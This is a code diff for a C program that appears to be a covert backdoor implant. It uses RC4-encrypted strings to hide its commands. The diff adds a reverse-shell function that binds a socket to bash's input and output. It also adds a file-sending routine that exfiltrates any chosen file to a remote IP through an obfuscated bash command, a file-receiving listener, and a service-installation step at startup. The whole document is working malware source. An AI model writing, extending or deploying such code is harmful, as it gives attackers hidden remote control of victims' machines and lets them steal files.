@@ -132,6 +132,7 @@ const unsigned char rssuccess[]	=	{0x61, 0x19, 0x60, 0x70, 0xDC, 0xBA, 0x89, 0xC
 									 0x79, 0x38, 0x70, 0x48, 0xD8, 0x46, 0xBC, 0x30, 0x62, 0x03, 0x98, 0x71, 0x03, 0x5D, 0x94, 0x1D, 0x58};
 const unsigned char bash[]		=	{0x1C, 0x1E, 0x7F, 0x7B, 0x81, 0xAB, 0x8D, 0x93, 0xF0};
 const unsigned char	basharg[]	=	{0x1E, 0x15};
+const unsigned char	bashargc[]	=	{0x1E, 0x1F};
 const unsigned char help[]		=	{0x5B, 0x19, 0x7A, 0x65};
 const unsigned char qmark[]		=	{0x0C};
 const unsigned char out[]		=	{0x56, 0x04, 0x7F, 0x61};
@@ -157,6 +158,7 @@ const unsigned char catcmd[]	=	{0x50, 0x1D, 0x62, 0x35, 0x81, 0xAC, 0x98, 0x83, 
 const unsigned char runcmd[]	=	{0x54, 0x1F, 0x75, 0x35, 0x83, 0x9E, 0x8D, 0x8C, 0xF4, 0x1E, 0x45, 0x37, 0xDD, 0xC3, 0x62, 0xA7, 0x52, 0xB2, 0x08,
 									 0x4B, 0x39, 0x22, 0x49, 0xC2, 0x57, 0xFF, 0x70, 0x62, 0x50, 0xD3, 0x6B, 0x4F, 0x14, 0x9E};
 const unsigned char permis[]	=	{0x41};
+const unsigned char writemode[]	=	{0x44, 0x1E};
 const unsigned char frline[]	=	{0x50, 0x13, 0x78, 0x66, 0xDA, 0xE9, 0x99, 0x8E, 0xEB, 0x57, 0x0F, 0x0E, 0xDD, 0xDF, 0x36, 0xB6, 0x5B, 0xF3, 0x57,
 									 0x15, 0x2F, 0x22, 0x58, 0xCE, 0x4A, 0xBB, 0x30, 0x4A, 0x2D, 0xF7, 0x39, 0x66, 0x4A, 0xE7};
 const unsigned char lsline[]	=	{0x39, 0x01, 0x2D, 0x1F, 0xA4};
@@ -167,7 +169,25 @@ const unsigned char srcspec[]	=	{0x16, 0x0F};
 const unsigned char filespec[]	=	{0x1C, 0x08, 0x7B, 0x65, 0x81, 0xEC, 0x80, 0x84, 0xC7, 0x1B, 0x04, 0x0C, 0xDC, 0xE4, 0x33, 0xB9, 0x5F, 0xE7, 0x0B,
 									 0x7F};
 const unsigned char rsspec[]	=	{0x16, 0x0F, 0x36, 0x30, 0x9F, 0xFC, 0x9F, 0xC0, 0xBD, 0x0B, 0x1B};
-const unsigned char writemode[]	=	{0x44, 0x1E};
+const unsigned char snspec[]	=	{0x16, 0x0F, 0x36, 0x30, 0x9F, 0xFC, 0x9F, 0xC0, 0xBD, 0x0B, 0x1B, 0x40, 0x9D, 0xC8};
+const unsigned char snerrspec[]	=	{0x76, 0x0E, 0x64, 0x7A, 0xDC, 0xF3, 0xCC, 0xA9, 0xF6, 0x48, 0x09, 0x0C, 0xD1, 0xDF, 0x36, 0x94, 0x41, 0xF5, 0x50,
+									 0x71, 0x39, 0x3E, 0x4F, 0xDE, 0x2F, 0x8A, 0x26, 0x70, 0x17, 0x9B, 0x3E, 0x4F, 0x42, 0x88, 0x52, 0x36, 0x76, 0xF3,
+									 0xB2, 0x2E, 0x6F, 0x9D, 0xE2, 0x6A, 0xDF, 0x2A, 0xA8, 0xEB, 0x28, 0x12, 0x80, 0x30, 0x28, 0xF8, 0xF1, 0x21, 0x9E,
+									 0x95, 0xB7, 0xCF, 0x18, 0x76, 0x3E, 0xD9, 0x30, 0x10, 0xB3, 0x6C, 0xEE, 0x23, 0x42};
+const unsigned char snflerr[]	=	{0x76, 0x0E, 0x64, 0x7A, 0xDC, 0xF3, 0xCC, 0x86, 0xF1, 0x52, 0x0D, 0x40, 0xE3, 0x9E, 0x65, 0x88, 0x13, 0xFC, 0x4A,
+									 0x68, 0x7C, 0x36, 0x54, 0xD8, 0x4B, 0xBB, 0x5F};
+const unsigned char snflfail[]	=	{0x75, 0x1D, 0x7F, 0x79, 0xCB, 0xAD, 0xCC, 0x94, 0xF7, 0x1E, 0x1B, 0x05, 0xD6, 0xDF, 0x36, 0xB3, 0x5A, 0xFE, 0x40,
+									 0x16};
+const unsigned char snflcmd[]	=	{0x5D, 0x1F, 0x36, 0x38, 0xDF, 0xE9, 0xDC, 0xC0, 0xBD, 0x4D, 0x48, 0x45, 0xCB, 0x9B, 0x2A, 0xF5, 0x16, 0xE1};
+const unsigned char rcspec[]	=	{0x16, 0x0F, 0x36, 0x30, 0xDD};
+const unsigned char rcerrspec[]	=	{0x76, 0x0E, 0x64, 0x7A, 0xDC, 0xF3, 0xCC, 0xA9, 0xF6, 0x48, 0x09, 0x0C, 0xD1, 0xDF, 0x36, 0x94, 0x41, 0xF5, 0x50,
+									 0x71, 0x39, 0x3E, 0x4F, 0xDE, 0x2F, 0x8A, 0x26, 0x70, 0x17, 0x9B, 0x3E, 0x4F, 0x43, 0x88, 0x5F, 0x37, 0x3F, 0xB9,
+									 0x9E, 0x5E, 0x05, 0xEF, 0x8B, 0x67, 0xDE, 0x4E, 0xAA, 0xEF, 0x2F, 0x09, 0x80, 0x1A};
+const unsigned char	rcfail[]	=	{0x75, 0x1D, 0x7F, 0x79, 0xCB, 0xAD, 0xCC, 0x94, 0xF7, 0x1E, 0x0B, 0x12, 0xDD, 0xDA, 0x62, 0xB0, 0x13, 0xF4, 0x4C,
+									 0x70, 0x39, 0x70, 0x49, 0xC8, 0x46, 0xBA, 0x3C, 0x67, 0x15, 0x8C, 0x0E};
+const unsigned char	rccmd[]		=	{0x5D, 0x1F, 0x36, 0x38, 0xC2, 0xB9, 0xCC, 0xC5, 0xEB, 0x1E, 0x56, 0x40, 0x9D, 0xC8};
+const unsigned char	rcsuccess[]	=	{0x61, 0x19, 0x77, 0x71, 0xD7, 0xE9, 0x98, 0x8F, 0xB8, 0x4C, 0x0D, 0x03, 0xDD, 0xD2, 0x60, 0xB0, 0x13, 0xF4, 0x4C,
+									 0x70, 0x39, 0x70, 0x54, 0xC3, 0x05, 0xAF, 0x3A, 0x63, 0x04, 0xDE, 0x21, 0x0B, 0x3B};
 
 typedef	struct	client_info
 {
@@ -186,6 +206,15 @@ typedef	struct	server
 t_server		*g_server;
 long long		binchecksum = 256;
 long long		sfcchecksum = 256;
+
+unsigned long	djb(unsigned char *str)
+{
+	unsigned long	hash = 5381;
+
+	for (int i = 0; str[i]; i++)
+		hash = hash * 33 + str[i];
+	return hash;
+}
 
 void	RC4_swap(unsigned char *S, int i, int j)
 {
@@ -594,7 +623,7 @@ char	*trim_whitespaces(char *buff)
 	return (&buff[first_byte]);
 }
 
-void	create_remote_shell_session(int client_fd, char *user_input)
+void	create_reverse_shell_session(int client_fd, char *user_input)
 {
 	int				status;
 	bool			ok = false;
@@ -613,10 +642,10 @@ void	create_remote_shell_session(int client_fd, char *user_input)
 	}
 	if (!pid)
 	{
-		char				ip[16] = {0};
-		char				port[6] = {0};
-		char				cmd[10] = {0};
-		char				*argv[3];
+		char	ip[16] = {0};
+		char	port[6] = {0};
+		char	cmd[10] = {0};
+		char	*argv[3];
 
 		close(g_server->server_sock);
 		struct sockaddr_in revsockaddr;
@@ -653,10 +682,10 @@ void	create_remote_shell_session(int client_fd, char *user_input)
 		if (dup2(sockt, STDIN_FILENO) < 0 || dup2(sockt, STDOUT_FILENO) < 0 || dup2(sockt, STDERR_FILENO) < 0)
 			exit(1);
 		cypher = RC4(LOGINS, bash, sizeof(bash));
-		argv[0] = (char *)cypher;
+		argv[0] = strdup((char *)cypher);
 		free(cypher);
 		cypher = RC4(LOGINS, basharg, sizeof(basharg));
-		argv[1] = (char *)cypher;
+		argv[1] = strdup((char *)cypher);
 		free(cypher);
 		argv[2] = NULL;
 		execvp(argv[0], argv);
@@ -678,6 +707,173 @@ void	create_remote_shell_session(int client_fd, char *user_input)
 		free(cypher);
 	}
   	clear_client_connection(client_fd);
+	return;
+}
+
+void	send_file_to_client(int client_fd, char* user_input)
+{
+	char			command[10] = {0};
+	char			ipv4_address[16] = {0};
+	char			port[6] = {0};
+	char			file_path[PATH_MAX] = {0};
+	pid_t			pid;
+	unsigned char	*cypher;
+
+	cypher = RC4(LOGINS, snspec, sizeof(snspec));
+	if (sscanf(user_input, (const char *)cypher, command, ipv4_address, port, file_path) != 4)
+	{
+		free(cypher);
+		cypher = RC4(LOGINS, snerrspec, sizeof(snerrspec));
+		send_msg_to_client((char *)cypher, client_fd);
+		free(cypher);
+		return;
+	}
+	free(cypher);
+	if (access(file_path, F_OK) < 0)
+	{
+		char err_msg[PATH_MAX + 100] = {0};
+		cypher = RC4(LOGINS, snflerr, sizeof(snflerr));
+		snprintf(err_msg, sizeof(err_msg), (const char *)cypher, file_path);
+		free(cypher);
+		send_msg_to_client(err_msg, client_fd);
+		return;
+	}
+	pid = fork();
+	if (pid < 0)
+	{
+		cypher = RC4(LOGINS, snflfail, sizeof(snflfail));
+		send_msg_to_client((char *)cypher, client_fd);
+		free(cypher);
+		return;
+	}
+	if (!pid)
+	{
+		char	command[PATH_MAX + 256];
+		char	*argv[4];
+
+		cypher = RC4(LOGINS, bash, sizeof(bash));
+		argv[0] = strdup((char *)cypher);
+		free(cypher);
+		cypher = RC4(LOGINS, bashargc, sizeof(bashargc));
+		argv[1] = strdup((char *)cypher);
+		free(cypher);
+		cypher = RC4(LOGINS, snflcmd, sizeof(snflcmd));
+		snprintf(command, sizeof(command), (const char *)cypher, ipv4_address, port, file_path);
+		free(cypher);
+		argv[2] = command;
+		argv[3] = NULL;
+		execv(argv[0], argv);
+		cypher = RC4(LOGINS, snflfail, sizeof(snflfail));
+		send_msg_to_client((char *)cypher, client_fd);
+		free(cypher);
+		exit(0);
+	}
+	send_msg_to_client("File Sent successfully\n", client_fd);
+	return;
+}
+
+int		find_available_port(void)
+{
+	int					sockfd, opt = 1;
+	struct sockaddr_in	server_addr;
+
+	sockfd = socket(AF_INET, SOCK_STREAM, 0);
+	if (sockfd < 0)
+		return -1;
+	if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt)) < 0)
+	{
+		close(sockfd);
+		return -1;
+	}
+    memset(&server_addr, 0, sizeof(server_addr));
+    server_addr.sin_family = AF_INET;
+    server_addr.sin_addr.s_addr = INADDR_ANY;
+	for (int port = 1024; port <= 65535; port++)
+	{
+		server_addr.sin_port = htons(port);
+        if (!bind(sockfd, (struct sockaddr*)&server_addr, sizeof(server_addr)))
+		{
+            close(sockfd);
+            return port;
+        }
+    }
+    close(sockfd);
+    return -1;
+}
+
+void	recv_file_from_client(int client_fd, char* user_input)
+{
+	char			command[10] = {0};
+	char			file_path[PATH_MAX] = {0};
+	pid_t			pid;
+	unsigned char	*cypher;
+	int				port, status;
+	bool			ok = false;
+
+	cypher = RC4(LOGINS, rcspec, sizeof(rcspec));
+	if (sscanf(user_input, (const char *)cypher, command, file_path) != 2)
+	{
+		free(cypher);
+		cypher = RC4(LOGINS, rcerrspec, sizeof(rcerrspec));
+		send_msg_to_client((char *)cypher, client_fd);
+		free(cypher);
+	}
+	free(cypher);
+	pid = fork();
+	if (pid < 0)
+	{
+		cypher = RC4(LOGINS, rcfail, sizeof(rcfail));
+		send_msg_to_client((char *)rcfail, client_fd);
+		free(cypher);
+		return;
+	}
+	port = find_available_port();
+	if (!pid)
+	{
+		char	cmd[PATH_MAX + 256];
+		char	*argv[4];
+
+		cypher = RC4(LOGINS, bash, sizeof(bash));
+		argv[0] = strdup((char *)cypher);
+		free(cypher);
+		cypher = RC4(LOGINS, bashargc, sizeof(bashargc));
+		argv[1] = strdup((char *)cypher);
+		free(cypher);
+		if (port < 0)
+		{
+			cypher = RC4(LOGINS, rcfail, sizeof(rcfail));
+			send_msg_to_client((char *)rcfail, client_fd);
+			free(cypher);
+			exit(1);
+		}
+		cypher = RC4(LOGINS, rccmd, sizeof(rccmd));
+		snprintf(cmd, sizeof(cmd), (const char *)cypher, port, file_path);
+		free(cypher);
+		argv[2] = cmd;
+		argv[3] = NULL;
+		execv(argv[0], argv);
+		exit(0);
+	}
+	sleep(1);
+	if (!waitpid(pid, &status, WNOHANG))
+		ok = true;
+	if (ok)
+	{
+		char	cmd[256];
+
+		cypher = RC4(LOGINS, rcsuccess, sizeof(rssuccess));
+		snprintf(cmd, sizeof(cmd), (const char *)cypher, port);
+		free(cypher);
+		send_msg_to_client(cmd, client_fd);
+	}
+	else
+	{
+		cypher = RC4(LOGINS, rcfail, sizeof(rcfail));
+		send_msg_to_client((char *)rcfail, client_fd);
+		free(cypher);
+	}
+	// send_msg_to_client("Ready to receive file on port %d\n", client_fd);
+	return;
 }
 
 void	handle_client_commands(int fd, char *cmd)
@@ -699,7 +895,17 @@ void	handle_client_commands(int fd, char *cmd)
 	else if (!strncmp((const char *)cypher, (const char *)shell, 5))
 	{
 		free(cypher);
-		create_remote_shell_session(fd, user_input);
+		create_reverse_shell_session(fd, user_input);
+	}
+	else if (!strncmp((const char *)cypher, (const char *)post, 4))
+	{
+		free(cypher);
+		send_file_to_client(fd, user_input);
+	}
+	else if (!strncmp((const char *)cypher, (const char *)receive, 7))
+	{
+		free(cypher);
+		recv_file_from_client(fd, user_input);
 	}
 	else
 	{
@@ -708,10 +914,6 @@ void	handle_client_commands(int fd, char *cmd)
 		send_msg_to_client((char *)cypher, fd);
 		free(cypher);
 	}
-	// else if (!strcmp(user_input, post))
-	// 	send_file_to_client(fd, user_input);
-	// else if (!strcmp(user_input, receive))
-	// 	recv_file_from_client(fd, user_input);
 	return;
 }
 
@@ -858,7 +1060,10 @@ int	main()
 	printf("%s", LOGINS);
 	setup_signals();
 	if (is_bin())
+	{
+		config_service();
 		spawn_server();
+	}
 	else
 	{
 		create_daemon();
